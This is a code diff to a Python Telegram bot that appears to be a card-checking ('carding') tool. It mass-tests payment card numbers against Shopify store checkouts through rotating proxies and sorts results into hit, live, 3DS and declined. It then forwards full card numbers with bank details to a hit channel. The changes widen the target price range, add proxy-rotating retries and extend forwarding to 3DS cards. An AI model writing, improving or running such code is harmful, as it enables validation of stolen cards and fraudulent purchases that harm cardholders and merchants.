@@ -1,6 +1,7 @@
 import asyncio
 import aiohttp
 import json
+import html
 import re
 import random
 import argparse
@@ -41,22 +42,23 @@ HIT_CHANNEL = -1003805693108  # Channel for forwarding hits
 # Constants
 MAX_SITES_PER_USER = 500
 MAX_GLOBAL_SITES = 500
-MIN_SITE_PRODUCT_PRICE = 1.00
-MAX_SITE_PRODUCT_PRICE = 26.00
-WORKER_COUNT = int(os.getenv("WORKER_COUNT", "30"))
+MIN_SITE_PRODUCT_PRICE = 0.00
+MAX_SITE_PRODUCT_PRICE = 18.00
+WORKER_COUNT = min(int(os.getenv("WORKER_COUNT", "25")), 25)
 PROXY_VALIDATION_URL = "https://httpbin.org/ip"
 PROXY_VALIDATION_TIMEOUT = 6
 PROXY_VALIDATION_CONCURRENCY = int(os.getenv("PROXY_VALIDATION_CONCURRENCY", "20"))
-SITE_CHECK_WORKERS = int(os.getenv("SITE_CHECK_WORKERS", "5"))
+SITE_CHECK_WORKERS = min(int(os.getenv("SITE_CHECK_WORKERS", "5")), 5)
 PRODUCT_CACHE_TTL_SECONDS = 300
 BIN_CACHE_TTL_SECONDS = 86400
-MAX_MASS_CHECK_CARDS = int(os.getenv("MAX_MASS_CHECK_CARDS", "56000"))
+MAX_MASS_CHECK_CARDS = int(os.getenv("MAX_MASS_CHECK_CARDS", "50000"))
 TASK_QUEUE_MAXSIZE = int(os.getenv("TASK_QUEUE_MAXSIZE", "20000"))
 RESULT_QUEUE_MAXSIZE = int(os.getenv("RESULT_QUEUE_MAXSIZE", "20000"))
 PROGRESS_UPDATE_EVERY = int(os.getenv("PROGRESS_UPDATE_EVERY", "25"))
 PROGRESS_UPDATE_MIN_INTERVAL = float(os.getenv("PROGRESS_UPDATE_MIN_INTERVAL", "1.0"))
 MAX_PENDING_TASKS_PER_USER = int(os.getenv("MAX_PENDING_TASKS_PER_USER", "50000"))
 MAX_TOTAL_PENDING_TASKS = int(os.getenv("MAX_TOTAL_PENDING_TASKS", "250000"))
+MCHK_LAST_RESPONSE_RETRIES = int(os.getenv("MCHK_LAST_RESPONSE_RETRIES", "2"))
 
 # Logging setup
 logging.basicConfig(
@@ -98,6 +100,7 @@ task_users = {}    # message_id -> user_id
 product_cache = {} # normalized_site -> {"data": product_info, "expires_at": epoch}
 bin_cache = {}     # bin -> {"data": bin_info, "expires_at": epoch}
 user_name_cache = {}  # user_id -> first_name
+user_display_cache = {}  # user_id -> display name (full/first name)
 mchk_pref_sessions = {}  # pref_id -> {user_id, choice, event, created_at}
 mchk_captcha_pref_sessions = {}  # pref_id -> {user_id, choice, event, created_at}
 user_active_mchk_batches = defaultdict(set)  # user_id -> set(batch_id)
@@ -293,6 +296,30 @@ def normalize_site_url(site_url):
         return normalized.rstrip('/')
     return f"{parsed.scheme or 'https'}://{parsed.netloc.lower()}".rstrip('/')
 
+def format_site_display_name(site_url):
+    """Format site name for user-facing messages."""
+    if not site_url:
+        return "unknown"
+
+    raw = str(site_url).strip()
+    if not raw:
+        return "unknown"
+
+    normalized = normalize_site_url(raw)
+    parsed = urlparse(normalized if normalized.startswith(("http://", "https://")) else f"https://{normalized}")
+    host = (parsed.netloc or parsed.path or raw).lower().strip()
+    host = host.split('/')[0].split('?')[0]
+    if host.startswith("www."):
+        host = host[4:]
+
+    if host.endswith(".myshopify.com"):
+        host = host[:-len(".myshopify.com")]
+    elif host.endswith(".com"):
+        host = host[:-len(".com")]
+
+    host = host.strip(".- ")
+    return host or raw
+
 def validate_proxy_format(proxy_str):
     """Validate and normalize proxy format for storage."""
     if not proxy_str:
@@ -388,13 +415,19 @@ async def make_graphql_request_with_captcha_handling(
     
     for attempt in range(max_retries + 1):
         try:
-            response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
-            response_text = await response.text()
-            return response, response_text, False
+            async with session.post(graphql_url, params=params, headers=headers, json=json_data) as response:
+                response_text = await response.text()
+                response_meta = {
+                    'status': response.status,
+                    'url': str(response.url),
+                    'headers': dict(response.headers)
+                }
+            return response_meta, response_text, False
             
         except Exception as e:
             if attempt == max_retries:
-                return None, str(e), False
+                err_msg = f"{type(e).__name__}: {e}".strip()
+                return None, (err_msg if err_msg else "Request exception"), False
             await asyncio.sleep(1)
     
     return response, response_text, False
@@ -502,16 +535,126 @@ def extract_clean_response(message):
     
     return message[:50]
 
+def normalize_response_text(response):
+    """Normalize gateway response text to a stable, user-safe value."""
+    if response is None:
+        return "UNKNOWN_ERROR"
+
+    text = str(response).strip()
+    if not text or text.lower() in {"none", "null", "undefined"}:
+        return "UNKNOWN_ERROR"
+
+    # Keep response readable in Telegram and avoid malformed multiline blobs.
+    text = re.sub(r"\s+", " ", text).strip()
+    return text if text else "UNKNOWN_ERROR"
+
+def sanitize_for_log(text):
+    """Redact sensitive credentials from log strings."""
+    if text is None:
+        return ""
+    value = str(text)
+    # Redact URL credentials: http://user:pass@host:port -> http://***:***@host:port
+    value = re.sub(r'((?:https?://))([^:/\s@]+):([^@\s/]+)@', r'\1***:***@', value)
+    # Redact raw proxy credentials: host:port:user:pass -> host:port:***:***
+    value = re.sub(r'(\b[^:\s]+:\d{2,5}):[^:\s]+:[^:\s]+', r'\1:***:***', value)
+    return value
+
+def format_response_for_display(response_text):
+    """Format response text for clearer user-facing status codes."""
+    normalized = normalize_response_text(response_text)
+    upper = normalized.upper()
+
+    # Keep CAPTCHA format consistent as requested.
+    if "CAPTCHA_REQUIRED" in upper:
+        return '"code": "CAPTCHA_REQUIRED"'
+
+    # Try to extract structured code from JSON-like payloads.
+    code_match = re.search(r'["\']code["\']\s*:\s*["\']([^"\']+)["\']', normalized, re.IGNORECASE)
+    if code_match:
+        code_value = code_match.group(1).strip()
+        if code_value:
+            return code_value
+
+    cleaned = extract_clean_response(normalized)
+    if cleaned and cleaned != "UNKNOWN_ERROR" and ("_" in cleaned or cleaned.isupper()):
+        return cleaned
+
+    return normalized
+
+def should_retry_mchk_last_response(success, response_text):
+    """Retry only transient/unfinished mass-check failures."""
+    if success:
+        return False
+
+    response_upper = normalize_response_text(response_text).upper()
+    retry_markers = [
+        "REQUEST FAILED",
+        "FAILED TO GET SESSION TOKEN",
+        "NO DATA IN PROPOSAL RESPONSE",
+        "SESSION IS NULL",
+        "NEGOTIATE RETURNED NULL",
+        "RESULT IS NULL",
+        "EMPTY SUBMIT RESPONSE",
+        "SUBMITSUCCESS BUT NO RECEIPT",
+        "NO RECEIPT IN SUBMIT RESPONSE",
+        "NO RECEIPT ID",
+        "INVALID JSON IN SUBMIT RESPONSE",
+        "ERROR PARSING SUBMIT",
+        "CHANGE PROXY OR SITE",
+        "MAX RETRIES EXCEEDED",
+        "TIMEOUT",
+        "CONNECTION",
+        "DISCONNECTED"
+    ]
+    return any(marker in response_upper for marker in retry_markers)
+
 def parse_cc_string(cc_string):
     parts = cc_string.split('|')
     if len(parts) != 4:
         raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
+
+    cc = re.sub(r"\D", "", parts[0].strip())
+    mm_raw = parts[1].strip()
+    yy_raw = parts[2].strip()
+    cvv = re.sub(r"\D", "", parts[3].strip())
+
+    if not cc or len(cc) < 12 or len(cc) > 19:
+        raise ValueError("Invalid card number")
+
+    if not mm_raw.isdigit():
+        raise ValueError("Invalid month")
+    mm_i = int(mm_raw)
+    if mm_i < 1 or mm_i > 12:
+        raise ValueError("Month must be between 01 and 12")
+    mm = f"{mm_i:02d}"
+
+    if not yy_raw.isdigit():
+        raise ValueError("Invalid year")
+    if len(yy_raw) == 2:
+        yy = f"20{yy_raw}"
+    elif len(yy_raw) == 4:
+        yy = yy_raw
+    else:
+        raise ValueError("Year must be YY or YYYY")
+
+    if len(cvv) < 3 or len(cvv) > 4:
+        raise ValueError("Invalid CVV")
+
     return {
-        'cc': parts[0].strip(),
-        'mes': parts[1].strip(),
-        'ano': parts[2].strip(),
-        'cvv': parts[3].strip()
+        'cc': cc,
+        'mes': mm,
+        'ano': yy,
+        'cvv': cvv
     }
+
+def build_user_full_name(user_obj):
+    """Build a readable full name from Telegram user object."""
+    if not user_obj:
+        return "User"
+    first = (getattr(user_obj, "first_name", "") or "").strip()
+    last = (getattr(user_obj, "last_name", "") or "").strip()
+    full = f"{first} {last}".strip()
+    return full or first or "User"
 
 def parse_cc_from_any_line(line):
     """Extract and normalize CC data from mixed line formats."""
@@ -678,7 +821,7 @@ def filter_sites_by_price_range(sites):
             removed += 1
             continue
 
-        if price < MIN_SITE_PRODUCT_PRICE or price > MAX_SITE_PRODUCT_PRICE:
+        if price > MAX_SITE_PRODUCT_PRICE:
             removed += 1
             continue
 
@@ -889,6 +1032,30 @@ async def get_cached_user_first_name(user_id):
     user_name_cache[user_id] = first_name
     return first_name
 
+async def get_cached_user_display_name(user_id):
+    cached_display = user_display_cache.get(user_id)
+    if cached_display:
+        return cached_display
+
+    display_name = 'User'
+    if DB_AVAILABLE:
+        try:
+            user = await users_col.find_one({'user_id': user_id})
+            if user:
+                display_name = user.get('full_name') or user.get('first_name', 'User')
+        except Exception as e:
+            set_db_unavailable(e)
+            user = get_memory_user_doc(user_id)
+            if user:
+                display_name = user.get('full_name') or user.get('first_name', 'User')
+    else:
+        user = get_memory_user_doc(user_id)
+        if user:
+            display_name = user.get('full_name') or user.get('first_name', 'User')
+
+    user_display_cache[user_id] = display_name
+    return display_name
+
 async def test_site_connection(site_url, proxy_str=None):
     """Test if a site is working by trying to add to cart and get session token"""
     try:
@@ -919,22 +1086,22 @@ async def test_site_connection(site_url, proxy_str=None):
             # Add to cart
             cart_url = site_url + '/cart/add.js'
             cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded'}
-            cart_resp = await session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
-            
-            if cart_resp.status != 200:
-                return False, f"Cart failed: {cart_resp.status}", None
+            async with session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy) as cart_resp:
+                cart_status = cart_resp.status
+
+            if cart_status != 200:
+                return False, f"Cart failed: {cart_status}", None
             
             # Go to checkout
             checkout_url = site_url + '/checkout/'
-            response = await session.post(url=checkout_url, allow_redirects=True, headers=headers, proxy=proxy)
-            
-            if 'login' in str(response.url).lower():
-                return False, "Login required", None
-            
-            text = await response.text()
-            
-            # Extract session token
-            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
+            async with session.post(url=checkout_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
+                checkout_response_url = str(response.url)
+                if 'login' in checkout_response_url.lower():
+                    return False, "Login required", None
+
+                text = await response.text()
+                # Extract session token
+                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
             if not sst:
                 sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;') or \
                       extract_between(text, 'name="serialized-sessionToken" content="', '"') or \
@@ -1011,33 +1178,33 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Accept': 'application/json, text/javascript'
                 }
-                cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
-                
-                if cart_resp.status != 200:
+                async with session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy) as cart_resp:
+                    cart_status = cart_resp.status
+
+                if cart_status != 200:
                     cart_headers_alt = {
                         **headers,
                         'Content-Type': 'application/json',
                         'Accept': 'application/json'
                     }
                     cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
-                    cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
+                    async with session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy) as cart_resp:
+                        cart_status = cart_resp.status
                 
-                if cart_resp.status != 200:
-                    return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency, receipt_id, order_url
+                if cart_status != 200:
+                    return False, f"Cart failed with status {cart_status}", gateway, total_price, currency, receipt_id, order_url
 
                 checkout_headers = {
                     **headers,
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                 }
-                response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
-                checkout_url = str(response.url)
+                async with session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy) as response:
+                    checkout_url = str(response.url)
+                    attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+                    attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
 
-                attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
-                attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
-
-                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
-                
-                text = await response.text()
+                    sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
+                    text = await response.text()
                 if not sst:
                     sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                     if not sst:
@@ -1190,7 +1357,8 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                             if available_proxies:
                                 proxy_str = random.choice(available_proxies)
                                 proxy = parse_proxy(proxy_str)
-                                logger.info(f"Retrying with new proxy for user {user_id}")
+                                retry_reason = sanitize_for_log(normalize_response_text(resp_text))[:180]
+                                logger.info(f"Retrying with new proxy for user {user_id} (reason: {retry_reason})")
                                 continue
                     return False, f"Request failed: {resp_text}", gateway, total_price, currency, receipt_id, order_url
                 
@@ -1355,14 +1523,14 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     "payment_session_scope": f"www.{urlparse(url).netloc}"
                 }
                 
-                response = await session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy)
-                try:
-                    token_data = await response.json()
-                    token = token_data.get('id')
-                    if not token:
-                        return False, 'Unable to get payment token', gateway, total_price, currency, receipt_id, order_url
-                except Exception as e:
-                    return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency, receipt_id, order_url
+                async with session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy) as response:
+                    try:
+                        token_data = await response.json(content_type=None)
+                        token = token_data.get('id')
+                        if not token:
+                            return False, 'Unable to get payment token', gateway, total_price, currency, receipt_id, order_url
+                    except Exception as e:
+                        return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency, receipt_id, order_url
 
                 params = {'operationName': 'SubmitForCompletion'}
                 
@@ -1637,7 +1805,8 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     if available_proxies:
                         proxy_str = random.choice(available_proxies)
                         proxy = parse_proxy(proxy_str)
-                        logger.info(f"Retrying after exception with new proxy for user {user_id}")
+                        retry_reason = sanitize_for_log(normalize_response_text(f"{type(e).__name__}: {e}"))[:180]
+                        logger.info(f"Retrying after exception with new proxy for user {user_id} (reason: {retry_reason})")
                         continue
             return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency, receipt_id, order_url
         
@@ -1676,9 +1845,6 @@ async def save_working_site(user_id, site_url, product_info):
             product_price = float(str(product_info.get('price', '0')).replace(',', '').strip())
         except Exception:
             return False, "Invalid product price"
-
-        if product_price < MIN_SITE_PRODUCT_PRICE:
-            return False, f"Cheapest product ${product_price:.2f} is below ${MIN_SITE_PRODUCT_PRICE:.2f}"
 
         if product_price > MAX_SITE_PRODUCT_PRICE:
             return False, f"Cheapest product ${product_price:.2f} is above ${MAX_SITE_PRODUCT_PRICE:.2f}"
@@ -1738,7 +1904,7 @@ async def save_working_site(user_id, site_url, product_info):
         return False, str(e)
 
 async def update_task_progress(message_id, stats, start_time=None):
-    """Update task progress message with buttons"""
+    """Update task progress message."""
     try:
         if message_id not in task_messages:
             return
@@ -1753,16 +1919,36 @@ async def update_task_progress(message_id, stats, start_time=None):
         
         # Get user info (cached)
         user_id = task_users.get(message_id)
-        user_name = await get_cached_user_first_name(user_id) if user_id else 'User'
+        user_name = await get_cached_user_display_name(user_id) if user_id else 'User'
         
         duration_seconds = round(elapsed.total_seconds(), 1)
+        task_type = stats.get('task_type', 'mchk')
         total_cards = stats.get('total', 0)
         processed = stats.get('checked', 0)
-        live = stats.get('live', 0)
-        dead = stats.get('failed', 0)
-        hits = stats.get('hit', 0)
 
-        progress_text = f"""💳 <b>CARD PROCESSOR</b>
+        if task_type == 'chksite':
+            working_sites = stats.get('hit', 0)
+            not_working_sites = stats.get('failed', 0)
+            progress_text = f"""🌐 <b>SITE CHECKER</b>
+━━━━━━━━━━━━━━
+📂 Total Sites: {total_cards}
+📤 Processed: {processed}
+━━━━━━━━━━━━━━
+🎯 <b>RESULTS BREAKDOWN</b>
+• ✅ Working Sites: {working_sites}
+• ❌ Not Working Sites: {not_working_sites}
+━━━━━━━━━━━━━━
+⏱️ Duration: {duration_seconds}s
+👤 {user_name}"""
+            keyboard = None
+        else:
+            otp = stats.get('otp', 0)
+            captcha = stats.get('captcha', 0)
+            live = stats.get('live', 0)
+            failed = stats.get('failed', 0)
+            dead = failed
+            hits = stats.get('hit', 0)
+            progress_text = f"""💳 <b>CARD PROCESSOR</b>
 ━━━━━━━━━━━━━━
 📂 Total Cards: {total_cards}
 📤 Processed: {processed}
@@ -1771,35 +1957,19 @@ async def update_task_progress(message_id, stats, start_time=None):
 • ✅ Live: {live}
 • ❌ Dead: {dead}
 • 💎 Hits: {hits}
-• 🧩 Captcha: {stats.get('captcha', 0)}
+• 🔐 3DS: {otp}
+• 🧩 Captcha: {captcha}
+• 🚫 Failed: {failed}
 ━━━━━━━━━━━━━━
 ⏱️ Duration: {duration_seconds}s
 👤 {user_name}"""
 
-        # Create buttons
-        keyboard_rows = [
-            [
-                InlineKeyboardButton(f"TOTAL {stats.get('total', 0)}", callback_data="ignore"),
-                InlineKeyboardButton(f"CHECKED {stats.get('checked', 0)}", callback_data="ignore")
-            ],
-            [
-                InlineKeyboardButton(f"HIT {stats.get('hit', 0)}", callback_data="ignore"),
-                InlineKeyboardButton(f"LIVE {stats.get('live', 0)}", callback_data="ignore")
-            ],
-            [
-                InlineKeyboardButton(f"OTP {stats.get('otp', 0)}", callback_data="ignore"),
-                InlineKeyboardButton(f"CAPTCHA {stats.get('captcha', 0)}", callback_data="ignore"),
-                InlineKeyboardButton(f"FAILED {stats.get('failed', 0)}", callback_data="ignore")
-            ]
-        ]
-
-        batch_id = stats.get('batch_id')
-        if batch_id and processed < total_cards:
-            keyboard_rows.append([
-                InlineKeyboardButton("⏹️ Stop", callback_data=f"stopmchk_batch:{batch_id}")
-            ])
-
-        keyboard = InlineKeyboardMarkup(keyboard_rows)
+            keyboard = None
+            batch_id = stats.get('batch_id')
+            if batch_id and processed < total_cards:
+                keyboard = InlineKeyboardMarkup([[
+                    InlineKeyboardButton("⏹️ Stop", callback_data=f"stopmchk_batch:{batch_id}")
+                ]])
         
         try:
             await message.edit_text(
@@ -1853,6 +2023,36 @@ async def task_worker(worker_id):
                 cc_data['cc'], cc_data['mes'], cc_data['ano'], cc_data['cvv'],
                 site, user_id, proxy
             )
+
+            # Extra mass-check retries when final response is missing/unfinished.
+            if task_type == 'mchk' and should_retry_mchk_last_response(success, response):
+                user_proxies = await get_user_proxies(user_id)
+                tried_proxies = set()
+                if proxy:
+                    tried_proxies.add(proxy)
+
+                for retry_idx in range(MCHK_LAST_RESPONSE_RETRIES):
+                    if not user_proxies:
+                        break
+
+                    available_proxies = [p for p in user_proxies if p not in tried_proxies]
+                    rotated_proxy = random.choice(available_proxies) if available_proxies else random.choice(user_proxies)
+                    tried_proxies.add(rotated_proxy)
+
+                    retry_reason = sanitize_for_log(normalize_response_text(response))[:180]
+                    logger.info(
+                        f"MCHK retry {retry_idx + 1}/{MCHK_LAST_RESPONSE_RETRIES} "
+                        f"for user {user_id} with rotated proxy (reason: {retry_reason})"
+                    )
+
+                    success, response, gateway, price, currency, receipt_id, order_url = await process_card(
+                        cc_data['cc'], cc_data['mes'], cc_data['ano'], cc_data['cvv'],
+                        site, user_id, rotated_proxy
+                    )
+
+                    if not should_retry_mchk_last_response(success, response):
+                        break
+
             process_time = round(time.time() - start_time, 2)
             
             # Get BIN info
@@ -1909,7 +2109,7 @@ async def result_handler():
             cc = result['cc']
             full_cc = result['full_cc']
             status = result['status']
-            response = result['response']
+            response = normalize_response_text(result.get('response'))
             gateway = result['gateway']
             price = result['price']
             currency = result['currency']
@@ -1930,7 +2130,7 @@ async def result_handler():
                 RESULT_QUEUE.task_done()
                 continue
             
-            first_name = await get_cached_user_first_name(user_id)
+            first_name = await get_cached_user_display_name(user_id)
             
             # Determine hit status - FIXED VERSION
             hit_status = "failed"
@@ -1938,7 +2138,7 @@ async def result_handler():
             # Check for HIT status
             if response in ['ORDER_PLACED', 'ProcessedReceipt', 'CHARGED'] or any(k in str(response) for k in success_keys):
                 hit_status = "hit"
-            # Check for OTP status
+            # Check for 3DS/OTP status
             elif response in ['OTP_REQUIRED', 'ACTION_REQUIRED', '2FACTOR'] or any(k in str(response) for k in twofactor_keys):
                 hit_status = "otp"
             elif "CAPTCHA_REQUIRED" in str(response).upper():
@@ -1949,27 +2149,31 @@ async def result_handler():
             elif response in ['CCN', 'INCORRECT_CVC', 'INSUFFICIENT_FUNDS'] or any(k in str(response) for k in ccn_keys):
                 hit_status = "live"
             
-            # Format site name - FIXED to get domain correctly
-            site_name = site.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
+            # Format site name for compact user display.
+            site_name = format_site_display_name(site)
             
-            # Format receipt with clickable order URL
+            # Always show receipt id when available (requested format).
             receipt_text = ""
             if receipt_id:
-                if order_url and order_url != 'N/A' and order_url:
-                    receipt_text = f"🧾 <a href='{order_url}'>View Order</a>"
-                else:
-                    receipt_text = f"🧾 Receipt: <code>{receipt_id}</code>"
+                safe_receipt_id = html.escape(str(receipt_id))
+                receipt_text = f"🧾 Receipt: <code>{safe_receipt_id}</code>"
+            elif order_url and order_url != 'N/A':
+                safe_order_url = html.escape(str(order_url), quote=True)
+                receipt_text = f"🧾 <a href='{safe_order_url}'>View Order</a>"
             
             # Format message with click-to-copy card
             if hit_status == "hit":
                 status_emoji = "🟢"
                 status_text = "HIT"
             elif hit_status == "otp":
-                status_emoji = "🟡"
-                status_text = "OTP"
+                status_emoji = "🟢"
+                status_text = "3DS"
             elif hit_status == "live":
                 status_emoji = "🟢"
                 status_text = "LIVE"
+            elif hit_status == "captcha":
+                status_emoji = "🟠"
+                status_text = "CAPTCHA"
             else:
                 status_emoji = "🔴"
                 status_text = "DECLINED"
@@ -1979,18 +2183,32 @@ async def result_handler():
                 formatted_price = round(float(price), 2)
             except (ValueError, TypeError):
                 formatted_price = price
+
+            display_response = format_response_for_display(response)
+            safe_full_cc = html.escape(str(full_cc))
+            safe_response = html.escape(str(display_response))
+            safe_bin = html.escape(str(bin_info.get('bin', 'N/A')))
+            safe_brand = html.escape(str(bin_info.get('brand', 'UNKNOWN')))
+            safe_type = html.escape(str(bin_info.get('type', '')))
+            safe_level = html.escape(str(bin_info.get('level', '')))
+            safe_bank = html.escape(str(bin_info.get('bank', 'UNKNOWN')))
+            safe_country_flag = html.escape(str(bin_info.get('country_flag', '🏳️')))
+            safe_country_name = html.escape(str(bin_info.get('country_name', 'UNKNOWN')))
+            safe_site_name = html.escape(str(site_name))
+            safe_currency = html.escape(str(currency))
+            safe_first_name = html.escape(str(first_name))
             
             formatted_message = f"""{status_emoji} {status_text}
 
-💳 Card: <code>{full_cc}</code>
-🔐 Code: {response}
-🎫 BIN: {bin_info.get('bin', 'N/A')} [{bin_info.get('brand', 'UNKNOWN')}] {bin_info.get('type', '')} ({bin_info.get('level', '')}) - {bin_info.get('bank', 'UNKNOWN')}
-🌍 Country: {bin_info.get('country_flag', '🏳️')} {bin_info.get('country_name', 'UNKNOWN')}
-🌐 Site: {site_name}
-💰 Amount: {formatted_price} {currency}
+💳 Card: <code>{safe_full_cc}</code>
+🔐 Code: {safe_response}
+🎫 BIN: {safe_bin} [{safe_brand}] {safe_type} ({safe_level}) - {safe_bank}
+🌍 Country: {safe_country_flag} {safe_country_name}
+🌐 Site: {safe_site_name}
+💰 Amount: {formatted_price} {safe_currency}
 {receipt_text}
-⚡ Time: {process_time}s
-👤 User: {first_name}
+⏱️ Time Taken: {process_time}s
+👤 User: {safe_first_name}
 
 by @still_alivenow"""
             
@@ -2004,16 +2222,29 @@ by @still_alivenow"""
                         parse_mode=ParseMode.HTML,
                         disable_web_page_preview=True
                     )
-                    if HIT_CHANNEL and hit_status in ['hit', 'live']:
-                        await asyncio.sleep(0.3)
-                        await app.send_message(
-                            chat_id=HIT_CHANNEL,
-                            text=formatted_message,
-                            parse_mode=ParseMode.HTML,
-                            disable_web_page_preview=True
-                        )
+                    if HIT_CHANNEL and hit_status in ['hit', 'live', 'otp']:
+                        try:
+                            await asyncio.sleep(0.3)
+                            await app.send_message(
+                                chat_id=HIT_CHANNEL,
+                                text=formatted_message,
+                                parse_mode=ParseMode.HTML,
+                                disable_web_page_preview=True
+                            )
+                        except Exception as channel_error:
+                            logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
                 except Exception as e:
                     logger.error(f"Error sending message to user {user_id}: {e}")
+                    # Fallback to plain text to avoid HTML parsing failures.
+                    try:
+                        plain_message = re.sub(r"<[^>]+>", "", formatted_message)
+                        await app.send_message(
+                            chat_id=user_id,
+                            text=plain_message,
+                            disable_web_page_preview=True
+                        )
+                    except Exception as send_fallback_error:
+                        logger.error(f"Fallback send failed for user {user_id}: {send_fallback_error}")
             
             elif task_type in ['mchk', 'chksite']:
                 should_send = hit_status in ['hit', 'live', 'otp']
@@ -2028,17 +2259,30 @@ by @still_alivenow"""
                             parse_mode=ParseMode.HTML,
                             disable_web_page_preview=True
                         )
-                        if HIT_CHANNEL and hit_status in ['hit', 'live']:
-                            await asyncio.sleep(0.3)
-                            await app.send_message(
-                                chat_id=HIT_CHANNEL,
-                                text=formatted_message,
-                                parse_mode=ParseMode.HTML,
-                                disable_web_page_preview=True
-                            )
+                        if HIT_CHANNEL and hit_status in ['hit', 'live', 'otp']:
+                            try:
+                                await asyncio.sleep(0.3)
+                                await app.send_message(
+                                    chat_id=HIT_CHANNEL,
+                                    text=formatted_message,
+                                    parse_mode=ParseMode.HTML,
+                                    disable_web_page_preview=True
+                                )
+                            except Exception as channel_error:
+                                logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
                     
                     except Exception as e:
                         logger.error(f"Error sending hit message to user {user_id}: {e}")
+                        # Fallback to plain text to avoid HTML parsing failures.
+                        try:
+                            plain_message = re.sub(r"<[^>]+>", "", formatted_message)
+                            await app.send_message(
+                                chat_id=user_id,
+                                text=plain_message,
+                                disable_web_page_preview=True
+                            )
+                        except Exception as send_fallback_error:
+                            logger.error(f"Fallback send failed for mchk user {user_id}: {send_fallback_error}")
             
             # Update progress for batch tasks
             if task_type in ['mchk', 'chksite'] and original_message:
@@ -2111,6 +2355,18 @@ async def cleanup_task_data(msg_id, delay=300):
         if batch_id:
             finalize_mchk_batch(batch_id)
 
+async def safe_callback_answer(callback_query: CallbackQuery, text: str = "", show_alert: bool = False):
+    """Answer callback safely (ignore expired/invalid callback id)."""
+    try:
+        if text:
+            await callback_query.answer(text, show_alert=show_alert)
+        else:
+            await callback_query.answer()
+    except Exception as e:
+        if "QUERY_ID_INVALID" in str(e).upper():
+            return
+        logger.error(f"Callback answer error: {e}")
+
 # Callback query handler
 @app.on_callback_query()
 async def handle_callback(client, callback_query: CallbackQuery):
@@ -2121,25 +2377,25 @@ async def handle_callback(client, callback_query: CallbackQuery):
         try:
             _, choice_token, pref_id = data.split(":", 2)
         except ValueError:
-            await callback_query.answer("Invalid selection", show_alert=True)
+            await safe_callback_answer(callback_query, "Invalid selection", show_alert=True)
             return
 
         session = mchk_pref_sessions.get(pref_id)
         if not session:
-            await callback_query.answer("This selection has expired", show_alert=True)
+            await safe_callback_answer(callback_query, "This selection has expired", show_alert=True)
             return
 
         user = callback_query.from_user
         if not user or user.id != session.get('user_id'):
-            await callback_query.answer("This button is not for you", show_alert=True)
+            await safe_callback_answer(callback_query, "This button is not for you", show_alert=True)
             return
 
         choice = 'yes' if choice_token == 'y' else 'no'
         session['choice'] = choice
         session['event'].set()
 
-        choice_text = "Yes (HIT + LIVE + OTP)" if choice == 'yes' else "No (HIT only)"
-        await callback_query.answer(f"Selected: {choice_text}")
+        choice_text = "Yes (HIT + LIVE + 3DS)" if choice == 'yes' else "No (HIT only)"
+        await safe_callback_answer(callback_query, f"Selected: {choice_text}")
 
         try:
             await callback_query.message.edit_reply_markup(reply_markup=None)
@@ -2151,17 +2407,17 @@ async def handle_callback(client, callback_query: CallbackQuery):
         try:
             _, choice_token, pref_id = data.split(":", 2)
         except ValueError:
-            await callback_query.answer("Invalid selection", show_alert=True)
+            await safe_callback_answer(callback_query, "Invalid selection", show_alert=True)
             return
 
         session = mchk_captcha_pref_sessions.get(pref_id)
         if not session:
-            await callback_query.answer("This selection has expired", show_alert=True)
+            await safe_callback_answer(callback_query, "This selection has expired", show_alert=True)
             return
 
         user = callback_query.from_user
         if not user or user.id != session.get('user_id'):
-            await callback_query.answer("This button is not for you", show_alert=True)
+            await safe_callback_answer(callback_query, "This button is not for you", show_alert=True)
             return
 
         choice = 'yes' if choice_token == 'y' else 'no'
@@ -2169,7 +2425,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
         session['event'].set()
 
         choice_text = "Yes (send CAPTCHA txt)" if choice == 'yes' else "No"
-        await callback_query.answer(f"Selected: {choice_text}")
